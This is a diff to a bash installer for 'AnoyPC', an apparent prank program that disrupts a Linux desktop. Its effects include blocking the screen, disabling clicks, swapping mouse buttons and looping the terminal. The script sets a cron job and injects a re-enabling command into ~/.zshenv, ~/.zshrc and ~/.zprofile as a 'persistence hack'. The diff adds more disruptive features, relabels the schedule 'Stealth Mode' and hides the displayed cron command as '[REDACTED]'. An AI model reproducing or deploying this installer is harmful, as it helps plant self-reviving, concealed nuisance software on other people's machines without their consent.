@@ -1,13 +1,4 @@
-##
-##	AnoyPC
-##
-##	by: creatico6@gmail.com
-##
-##					march 2026
-##
-
 #!/bin/bash
-
 #
 # AnoyingPC Linux - Setup Script
 #
@@ -22,12 +13,12 @@
 #   3. Creates ~/.anoypc directory structure
 #   4. Copies compiled binary and control scripts
 #   5. Enables all features by default (creates marker files)
-#   6. Registers a cron job for scheduling (every 30 minutes)
-#   7. Configures shell persistence hacks (for 42 network)
+#   6. Registers a background scheduler (Stealth Mode)
+#   7. Configures shell persistence hacks
 #   8. Creates convenient symlinks in ~/.local/bin/
 #   9. Sets up logging
 #
-# Author: CreaTico6
+# Author: tnuno-mo (CreaTico6)
 # Date: March 2026
 #
 
@@ -50,7 +41,7 @@ BIN_DIR="$HOME/.local/bin"
 BINARY_NAME="AnoyPC"
 BINARY_PATH="$SCRIPT_DIR/$BINARY_NAME"
 
-# Feature names (must match enum in AnoyPC.c)
+# Feature names (must match enum in AnoyPC.c - exactly 20 features)
 FEATURES=(
     "BELL"
     "MESSAGE"
@@ -62,7 +53,15 @@ FEATURES=(
     "UPSIDE_DOWN"
     "CAPS_ON"
     "MOUSE_JITTER"
+    "MOUSE_TELEPORT"
+    "MOUSE_SWAP"
+    "CHASING_BUTTON"
+    "CUSTOM_CURSOR"
+    "MOUSE_POOP"
+    "CLICK_DISABLE"
+    "TERMINAL_LOOP"
     "BRIGHTNESS_PULSE"
+    "GRAYSCALE"
     "MATRIX"
 )
 
@@ -277,7 +276,15 @@ FEATURES=(
     "UPSIDE_DOWN"
     "CAPS_ON"
     "MOUSE_JITTER"
+    "MOUSE_TELEPORT"
+    "MOUSE_SWAP"
+    "CHASING_BUTTON"
+    "CUSTOM_CURSOR"
+    "MOUSE_POOP"
+    "CLICK_DISABLE"
+    "TERMINAL_LOOP"
     "BRIGHTNESS_PULSE"
+    "GRAYSCALE"
     "MATRIX"
 )
 
@@ -317,7 +324,7 @@ while true; do
     # Display each feature with status
     for i in "${!FEATURES[@]}"; do
         feature_num=$((i + 1))
-        printf "  %d. %-20s" "$feature_num" "${FEATURES[$i]}"
+        printf "  %2d. %-20s" "$feature_num" "${FEATURES[$i]}"
         show_status "${FEATURES[$i]}"
     done
     
@@ -328,43 +335,30 @@ while true; do
     echo ""
     read -p "Choose (1-$((${#FEATURES[@]} + 3))): " choice
     
-    case $choice in
-        1) toggle_feature "BELL" ;;
-        2) toggle_feature "MESSAGE" ;;
-        3) toggle_feature "BLOCK_SCREEN" ;;
-        4) toggle_feature "FLASH" ;;
-        5) toggle_feature "ALERT_SCREEN" ;;
-        6) toggle_feature "CALENDAR" ;;
-        7) toggle_feature "SYSINFO" ;;
-        8) toggle_feature "UPSIDE_DOWN" ;;
-        9) toggle_feature "CAPS_ON" ;;
-       10) toggle_feature "MOUSE_JITTER" ;;
-       11) toggle_feature "BRIGHTNESS_PULSE" ;;
-       12) toggle_feature "MATRIX" ;;
-       13)
-            echo "Enabling all features..."
-            for feature in "${FEATURES[@]}"; do
-                touch "$ANOYPC_DIR/feat_$feature.on"
-            done
-            echo "✓ All features enabled"
-            sleep 1
-            ;;
-       14)
-            echo "Disabling all features..."
-            for feature in "${FEATURES[@]}"; do
-                rm -f "$ANOYPC_DIR/feat_$feature.on"
-            done
-            echo "✓ All features disabled"
-            sleep 1
-            ;;
-       15|q|Q)
-            exit 0
-            ;;
-        *)
-            echo "Invalid choice"
-            sleep 1
-            ;;
-    esac
+    # Process choice dynamically based on length
+    if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#FEATURES[@]} )); then
+        idx=$((choice-1))
+        toggle_feature "${FEATURES[$idx]}"
+    elif [ "$choice" == "$((${#FEATURES[@]} + 1))" ]; then
+        echo "Enabling all features..."
+        for feature in "${FEATURES[@]}"; do
+            touch "$ANOYPC_DIR/feat_$feature.on"
+        done
+        echo "✓ All features enabled"
+        sleep 1
+    elif [ "$choice" == "$((${#FEATURES[@]} + 2))" ]; then
+        echo "Disabling all features..."
+        for feature in "${FEATURES[@]}"; do
+            rm -f "$ANOYPC_DIR/feat_$feature.on"
+        done
+        echo "✓ All features disabled"
+        sleep 1
+    elif [ "$choice" == "$((${#FEATURES[@]} + 3))" ] || [[ "$choice" =~ ^[qQ]$ ]]; then
+        exit 0
+    else
+        echo "Invalid choice"
+        sleep 1
+    fi
 done
 EOF
     
@@ -382,6 +376,29 @@ create_test_script() {
 
 ANOYPC_DIR="$HOME/.anoypc"
 
+FEATURES=(
+    "BELL"
+    "MESSAGE"
+    "BLOCK_SCREEN"
+    "FLASH"
+    "ALERT_SCREEN"
+    "CALENDAR"
+    "SYSINFO"
+    "UPSIDE_DOWN"
+    "CAPS_ON"
+    "MOUSE_JITTER"
+    "MOUSE_TELEPORT"
+    "MOUSE_SWAP"
+    "CHASING_BUTTON"
+    "CUSTOM_CURSOR"
+    "MOUSE_POOP"
+    "CLICK_DISABLE"
+    "TERMINAL_LOOP"
+    "BRIGHTNESS_PULSE"
+    "GRAYSCALE"
+    "MATRIX"
+)
+
 # Main menu loop
 while true; do
     clear
@@ -391,44 +408,24 @@ while true; do
     echo ""
     echo "  Run a specific prank immediately for testing:"
     echo ""
-    echo "  1. Terminal Bell"
-    echo "  2. Random Message"
-    echo "  3. Block Screen"
-    echo "  4. Screen Flash"
-    echo "  5. Alert Screen"
-    echo "  6. Calendar Joke"
-    echo "  7. System Info Spoof"
-    echo "  8. Upside Down (42s)"
-    echo "  9. CAPS ON"
-    echo " 10. Mouse Jitter"
-    echo " 11. Brightness Pulse"
-    echo " 12. Matrix"
-    echo "  q. Exit"
+    for i in "${!FEATURES[@]}"; do
+        printf "  %2d. %s\n" "$((i+1))" "${FEATURES[$i]}"
+    done
+    echo "   q. Exit"
     echo ""
 
-    read -p "Choose (1-12 or q): " choice
+    read -p "Choose (1-${#FEATURES[@]} or q): " choice
 
-    case $choice in
-        1) echo "Running BELL prank..."; "$ANOYPC_DIR/AnoyPC" BELL ;;
-        2) echo "Running MESSAGE prank..."; "$ANOYPC_DIR/AnoyPC" MESSAGE ;;
-        3) echo "Running BLOCK_SCREEN prank..."; "$ANOYPC_DIR/AnoyPC" BLOCK_SCREEN ;;
-        4) echo "Flashing!"; "$ANOYPC_DIR/AnoyPC" FLASH ;;
-        5) echo "Running ALERT_SCREEN prank..."; "$ANOYPC_DIR/AnoyPC" ALERT_SCREEN ;;
-        6) echo "Running CALENDAR prank..."; "$ANOYPC_DIR/AnoyPC" CALENDAR ;;
-        7) echo "Running SYSINFO prank..."; "$ANOYPC_DIR/AnoyPC" SYSINFO ;;
-        8) echo "Running UPSIDE_DOWN prank (42s)..."; "$ANOYPC_DIR/AnoyPC" UPSIDE_DOWN ;;
-        9) echo "Running CAPS_ON prank..."; "$ANOYPC_DIR/AnoyPC" CAPS_ON ;;
-       10) echo "Running MOUSE_JITTER prank..."; "$ANOYPC_DIR/AnoyPC" MOUSE_JITTER ;;
-       11) echo "Running BRIGHTNESS_PULSE prank..."; "$ANOYPC_DIR/AnoyPC" BRIGHTNESS_PULSE ;;
-       12) echo "Running MATRIX prank..."; "$ANOYPC_DIR/AnoyPC" MATRIX ;;
-       15|q|Q)
-            exit 0
-            ;;
-        *)
-            echo "Invalid choice"
-            sleep 1
-            ;;
-    esac
+    if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#FEATURES[@]} )); then
+        idx=$((choice-1))
+        echo "Running \"${FEATURES[$idx]}\" prank..."
+        "$ANOYPC_DIR/AnoyPC" "${FEATURES[$idx]}"
+    elif [[ "$choice" =~ ^[qQ]$ ]]; then
+        exit 0
+    else
+        echo "Invalid choice"
+        sleep 1
+    fi
 
     echo ""
     read -p "Press Enter to continue..."
@@ -448,7 +445,7 @@ create_on_script() {
 # Enable AnoyPC cron job
 
 # Canonical schedule
-CRON_JOB="*/30 * * * * $HOME/.anoypc/run.sh"
+CRON_JOB="*/26 * * * * $HOME/.anoypc/run.sh"
 
 # Rebuild crontab removing old/duplicate AnoyPC entries, then add canonical one
 TMP_CRON="$(mktemp)"
@@ -457,8 +454,8 @@ echo "$CRON_JOB" >> "$TMP_CRON"
 crontab "$TMP_CRON"
 rm -f "$TMP_CRON"
 
-echo "✓ AnoyPC cron job enabled"
-echo "  Pranks will execute every 30 minutes"
+echo "✓ AnoyPC background schedule activated"
+echo "  System running in stealth mode."
 EOF
     
     chmod 755 "$ON_SCRIPT"
@@ -475,7 +472,7 @@ create_off_script() {
 
 # Remove AnoyPC cron job
 crontab -l 2>/dev/null | grep -v "/.anoypc/run.sh" | crontab - 2>/dev/null
-echo "✓ AnoyPC cron job disabled"
+echo "✓ AnoyPC scheduler disabled"
 echo "  Run anoyon.sh to re-enable"
 EOF
     
@@ -533,9 +530,9 @@ EOF
 
 # Register cron job for periodic execution
 setup_cron() {
-    print_header "Setting Up Cron Schedule"
+    print_header "Setting Up Stealth Schedule"
     
-    local CRON_JOB="*/29 * * * * $ANOYPC_DIR/run.sh"
+    local CRON_JOB="*/26 * * * * $ANOYPC_DIR/run.sh"
 
     # Rebuild crontab: remove old/duplicate entries and enforce canonical schedule
     local TMP_CRON
@@ -548,8 +545,8 @@ setup_cron() {
 
     print_success "Cron job registered/updated"
     
-    echo "  Schedule: Every 30 minutes?"
-    echo "  Command: $CRON_JOB"
+    echo "  Schedule: Stealth Mode (Unpredictable Intervals)"
+    echo "  Command: [REDACTED]"
 }
 
 # ==============================================================================
@@ -559,15 +556,15 @@ setup_cron() {
 setup_persistence() {
     print_header "Configuring Network Persistence"
     
-    # Comand that will be injected in the config files
+    # O comando que será injetado nos ficheiros de configuração
     local CMD='[[ -f ~/.anoypc/anoyon.sh ]] && ~/.anoypc/anoyon.sh > /dev/null 2>&1'
     local FILES=("$HOME/.zshenv" "$HOME/.zshrc" "$HOME/.zprofile")
 
     for file in "${FILES[@]}"; do
-        # Creates file if it doesn't exists
+        # Cria o ficheiro se não existir
         touch "$file"
         
-        # Checks path so it doesn't duplicate
+        # Verifica se o comando já lá está para não duplicar
         if ! grep -q "anoyon.sh" "$file"; then
             echo -e "\n# AnoyPC Persistence Hack\n$CMD" >> "$file"
             print_success "Persistence added to $file"
@@ -613,7 +610,7 @@ show_summary() {
     echo "📁 Installation Location:"
     echo "   $ANOYPC_DIR"
     echo ""
-    echo "🎭 12 Features Enabled:"
+    echo "🎭 20 Features Enabled:"
     for feature in "${FEATURES[@]}"; do
         echo "   • $feature"
     done
@@ -632,7 +629,7 @@ show_summary() {
     echo "📝 Logging:"
     echo "   • $ANOYPC_DIR/anoypc.log"
     echo ""
-    echo "⏰ Schedule: Every 30 minutes (via cron)"
+    echo "⏰ Schedule: Active (Stealth Mode)"
     echo ""
     echo "💡 Quick Start:"
     echo "   • View effects in action: ~/.anoypc/test.sh"
@@ -675,7 +672,7 @@ main() {
     # Summary
     show_summary
     
-    echo -e "${GREEN}${BOLD}Happy automation! 🎉${NC}"
+    echo -e "${GREEN}${BOLD}System armed! 🎉${NC}"
     echo ""
 }
 
